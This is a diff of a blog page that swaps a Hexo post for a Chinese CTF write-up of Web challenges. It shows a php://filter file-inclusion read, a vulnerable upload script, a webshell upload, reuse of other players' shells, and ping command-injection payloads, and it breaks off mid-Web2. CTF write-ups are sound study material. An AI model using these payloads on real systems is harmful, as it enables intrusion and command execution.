@@ -5,13 +5,15 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
-    <meta name="keywords" content="Hexo之渲染绕过, Erikten 计算机 网络安全 黑客 网络攻防 渗透测试 安全开发 代码审计 PHP Python 漏洞挖掘 0day">
+    <meta name="keywords" content="第三届山东新一代信息安全攻防赛——Web题目wp, Erikten 计算机 网络安全 黑客 网络攻防 渗透测试 安全开发 代码审计 PHP Python 漏洞挖掘 0day">
     <meta name="baidu-site-verification" content="fmlEuI34ir">
     <meta name="google-site-verification" content="KeoTn_OFy4ndJwXNmm2gMeQfPhd7alqE9vQDwI32KCY">
     <meta name="google-site-verification" content="pBWoGvVEP36FzzS4xIpoMejc5UKi3RKcxd9rWWcjiDg">
     <meta name="360-site-verification" content="2db45fc772bbd3e7efd0985eec0fff97">
-    <meta name="description" content="0x001 Hexo 渲染  在Hexo部署时会默认渲染source下的所有html页面，但有时候想在Hexo博客上单独自定义html页面或README.md时，却不希望被Hexo渲染。因此对某个文件或者目录进行排除渲染是非常必要的。
-0x">
+    <meta name="description" content="Web1方法一这道题的思路就是文件包含加代码审计，最后文件上传。
+先来扫一下目录访问/static，有目录遍历看一下upload.js的源码：
+$(function () {
+    $(&#34;#submit&#34;).on(&#34;click&#34;, fun">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -20,7 +22,7 @@
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="baidu-site-verification" content="wvlc3L96QK">
-    <title>Hexo之渲染绕过 | Erikten</title>
+    <title>第三届山东新一代信息安全攻防赛——Web题目wp | Erikten</title>
     <link rel="icon" type="image/png" href="/medias/logo.png">
 
     <link rel="stylesheet" type="text/css" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
@@ -595,13 +597,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/galleries/%E5%8A%A8%E6%BC%AB%E9%A3%8E%E6%99%AF/11.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/galleries/%E5%8A%A8%E6%BC%AB%E9%A3%8E%E6%99%AF/12.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        Hexo之渲染绕过
+                        第三届山东新一代信息安全攻防赛——Web题目wp
                     </div>
                 </div>
             </div>
@@ -721,12 +723,24 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/Hexo/" target="_blank">
-                                <span class="chip bg-color">Hexo</span>
+                            <a href="/tags/CTF/" target="_blank">
+                                <span class="chip bg-color">CTF</span>
                             </a>
                         
-                            <a href="/tags/渲染绕过/" target="_blank">
-                                <span class="chip bg-color">渲染绕过</span>
+                            <a href="/tags/代码审计/" target="_blank">
+                                <span class="chip bg-color">代码审计</span>
+                            </a>
+                        
+                            <a href="/tags/PHP/" target="_blank">
+                                <span class="chip bg-color">PHP</span>
+                            </a>
+                        
+                            <a href="/tags/EXP/" target="_blank">
+                                <span class="chip bg-color">EXP</span>
+                            </a>
+                        
+                            <a href="/tags/Bugku/" target="_blank">
+                                <span class="chip bg-color">Bugku</span>
                             </a>
                         
                     </div>
@@ -737,8 +751,8 @@
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/博客篇/" class="post-category" target="_blank">
-                                博客篇
+                            <a href="/categories/CTF篇/" class="post-category" target="_blank">
+                                CTF篇
                             </a>
                         
                     </div>
@@ -749,13 +763,13 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-04-28
+                    2020-03-20
                 </div>
 
                 <div class="post-author info-break-policy">
                     <i class="fa fa-user-o fa-fw"></i>作者:&nbsp;&nbsp;
                     
-                        luckyzmj
+                        Erikten
                     
                 </div>
 
@@ -763,14 +777,14 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        515
+                        774
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        2 分
+                        3 分
                     </div>
                     
                 
@@ -787,43 +801,125 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="0x001-Hexo-渲染"><a href="#0x001-Hexo-渲染" class="headerlink" title="0x001 Hexo 渲染"></a>0x001 Hexo 渲染</h3><p>  在Hexo部署时会默认渲染source下的所有html页面，但有时候想在Hexo博客上单独自定义html页面或README.md时，却不希望被Hexo渲染。因此对某个文件或者目录进行排除渲染是非常必要的。</p>
-<h3 id="0x002-方法一：font-matter"><a href="#0x002-方法一：font-matter" class="headerlink" title="0x002 方法一：font matter"></a>0x002 方法一：font matter</h3><p><code>Hexo</code>新建网站页面，然后将你的代码直接写入 <code>index.md</code> 中</p>
-<p>在 <code>Front matter</code> 中添加 <code>layout: false</code>，此方法适用于单一的纯<code>HTML</code><br><code>CSS</code> 页面。</p>
-<pre class="line-numbers language-bash"><code class="language-bash">---
-title: tools
-date: 2020-04-28 00:00:00
-type: <span class="token string">"tools"</span>
-layout: <span class="token boolean">false</span>
----<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="0x003-方法二：skip-render"><a href="#0x003-方法二：skip-render" class="headerlink" title="0x003 方法二：skip render"></a>0x003 方法二：skip render</h3><p>在博客根目录下的 <code>_config.yml</code>，找到 <code>skip_render</code>，大概在32行左右，写入你想要的跳过渲染的路径，注意缩进和空格。</p>
-<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 指定目录跳过hexo渲染</span>
-skip_render:
-  - <span class="token string">'tools/*'</span>
-  - <span class="token string">'tools/**'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<blockquote>
-<p>注释：<code>tools/*</code> 表示在目录 <code>source/fireworks</code> 下的文件全部跳过渲染，<code>tools/**</code> 表示在博客根目录 <code>source/tools/</code> 文件夹下的文件全部跳过渲染（例如页面的 js、css 在另一个文件夹中）。</p>
-</blockquote>
-<h3 id="0x004-案例：webstack-导航"><a href="#0x004-案例：webstack-导航" class="headerlink" title="0x004 案例：webstack 导航"></a>0x004 案例：webstack 导航</h3><p><code>webstack</code>是一个纯静态的网址导航网站，内容均由<code>viggo</code>收集并整理。项目基于<code>bootstrap</code>前端框架开发。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://camo.githubusercontent.com/41111c4c1d9922982f380566e6a2f8415204c52c/687474703a2f2f7777772e776562737461636b2e63632f6173736574732f696d616765732f707265766965772e676966" alt="image"></p>
-<ul>
-<li>Github：<a href="https://github.com/WebStackPage/WebStackPage.github.io" target="_blank" rel="noopener">https://github.com/WebStackPage/WebStackPage.github.io</a></li>
-</ul>
-<p>在博客根目录 <code>source/</code>下新建<code>tools</code>，然后新建<code>index.html</code>,将<code>webstack</code>网页源码全选复制粘贴到里面。</p>
-<ul>
-<li>本站的webstack源码：<a href="view-source:http://luckyzmj.cn/tools/" target="_blank" rel="noopener">view-source:http://luckyzmj.cn/tools/</a></li>
-</ul>
-<blockquote>
-<p>注意：将源码里的部分信息以及跳转链接按照你真实个人博客的环境进行修改。</p>
-</blockquote>
-<p>然后打开博客根目录下配置文件<code>_config.yml</code>，找到<code>skip_render</code>，做如下修改：</p>
-<pre class="line-numbers language-bash"><code class="language-bash">skip_render:
-  - <span class="token string">'tools/*'</span>
-  - <span class="token string">'tools/**'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>最后执行<code>hexo clean</code>和<code>hexo s -g</code>本地预览，检查无误后<code>hexo g -d</code>部署到服务器上即可。</p>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><ul>
-<li><a href="https://xiabor.com/2020/04/21/hexo3/#%E5%A6%82%E4%BD%95%E8%B7%B3%E8%BF%87hexo%E7%9A%84%E6%B8%B2%E6%9F%93" target="_blank" rel="noopener">https://xiabor.com/2020/04/21/hexo3/#%E5%A6%82%E4%BD%95%E8%B7%B3%E8%BF%87hexo%E7%9A%84%E6%B8%B2%E6%9F%93</a></li>
-</ul>
+                <h3 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h3><h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><p>这道题的思路就是文件包含加代码审计，最后文件上传。</p>
+<p>先来扫一下目录<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020111909243968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>访问/static，有目录遍历<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201119092924205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">看一下upload.js的源码：</p>
+<pre class="line-numbers language-js"><code class="language-js"><span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#submit"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">"click"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">var</span> fileName <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#file_name'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">var</span> fileContent <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#file_content'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
+            url<span class="token punctuation">:</span> <span class="token string">"/upload.php"</span><span class="token punctuation">,</span>
+            method<span class="token punctuation">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>
+            data<span class="token punctuation">:</span> <span class="token punctuation">{</span>filename<span class="token punctuation">:</span> fileName<span class="token punctuation">,</span> filecontent<span class="token punctuation">:</span> fileContent<span class="token punctuation">}</span><span class="token punctuation">,</span>
+            success<span class="token punctuation">:</span><span class="token keyword">function</span> <span class="token punctuation">(</span>data<span class="token punctuation">,</span> status<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                result <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">var</span> notice <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'&lt;div class="alert m-5" role="alert">'</span> <span class="token operator">+</span> result<span class="token punctuation">[</span><span class="token string">"info"</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'&lt;/div>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token string">"state"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    notice<span class="token punctuation">.</span><span class="token function">addClass</span><span class="token punctuation">(</span><span class="token string">"alert-success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span> <span class="token keyword">else</span>
+                    notice<span class="token punctuation">.</span><span class="token function">addClass</span><span class="token punctuation">(</span><span class="token string">"alert-danger"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'div.alert'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'div.alert'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'form.m-5'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">before</span><span class="token punctuation">(</span>notice<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>访问index.php，有文件包含<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201119093403296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>用php伪协议进行文件内容读取upload.php的源码</p>
+<pre class="line-numbers language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//47.105.128.249:36001/f.php?f=php://filter/read=convert.base64-encode/resource=upload.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+
+<span class="token variable">$res</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token shell-comment comment"># 判断filename是否为空</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"filename"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string">'state'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+    <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string">'info'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"è¯·ä¸ä¼ txtæ ¼å¼æä»¶"</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token shell-comment comment"># 若不为空变量file_name等于POST的filename</span>
+<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+    <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token shell-comment comment"># 过滤.php后缀的文件</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span> <span class="token operator">==</span> <span class="token string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string">'state'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span>
+        <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string">'info'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"æä»¶åéæ³ï¼"</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/[^a-zA-Z0-9.]+/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file_name</span> <span class="token operator">===</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string">'state'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span>
+        <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string">'info'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"è¦ä¼ å¥½å¥½ä¼ ï¼å«æå"</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token shell-comment comment"># 上传路径</span>
+    <span class="token variable">$file_path</span> <span class="token operator">=</span> <span class="token string">'./Uploads/'</span><span class="token punctuation">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>
+    <span class="token shell-comment comment"># 文件内容</span>
+    <span class="token variable">$fileContent</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filecontent'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token shell-comment comment"># 过滤eval</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$fileContent</span><span class="token punctuation">,</span><span class="token string">'eval'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string">'info'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"æ£æµå°æ¶æä»£ç ï¼ç¦æ­¢ä¸ä¼ ï¼"</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token shell-comment comment"># 过滤assert</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$fileContent</span><span class="token punctuation">,</span><span class="token string">'assert'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string">'info'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"æ£æµå°æ¶æä»£ç ï¼ç¦æ­¢ä¸ä¼ ï¼"</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">[</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">'php'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">,</span> <span class="token variable">$fileContent</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">,</span> <span class="token variable">$fileContent</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string">'state'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+    <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string">'info'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'æä»¶ä¿å­è³'</span><span class="token punctuation">.</span><span class="token variable">$file_path</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>读完源码思路就有了，直接在upload.php页面POST数据就行了：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020111910390756.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>成功上传：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201119103936210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>执行命令：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201119104229186.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>获取flag：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201119104635742.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><p>螳螂捕蝉，黄雀在后。它既然存在目录遍历，那我们等着就行了，刷新页面，看看那些木马上传成功了，然后利用文件包含，看一下源码，借用一下别人的马也是可以的。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201119105027865.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>包含一下：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201119105250111.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h3 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h3><h5 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h5><p>访问Web2的页面上来就给了一段代码，分析一下：</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token shell-comment comment"># 定义变量target接收url传值</span>
+<span class="token variable">$target</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token shell-comment comment"># 定义变量cmd接收ping -c 2 +target的执行返回结果</span>
+<span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string">'ping -c 2 '</span><span class="token punctuation">.</span><span class="token variable">$target</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token shell-comment comment"># 输出cmd</span>
+<span class="token keyword">echo</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>
+<span class="token shell-comment comment"># 高亮显示文件内容</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><p>很明显是一个命令执行，它这里应该是过滤了 &amp; ，我们用 ; 构造payload:</p>
+<pre class="line-numbers language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//47.105.128.249:35002/index.php?target=127.0.0.1;echo%20666</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201119140556188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>成功执行，那么就找一下flag文件：</p>
+<pre class="line-numbers language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//47.105.128.249:35002/index.php?target=127.0.0.1;find%20/%20-name%20*flag*</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
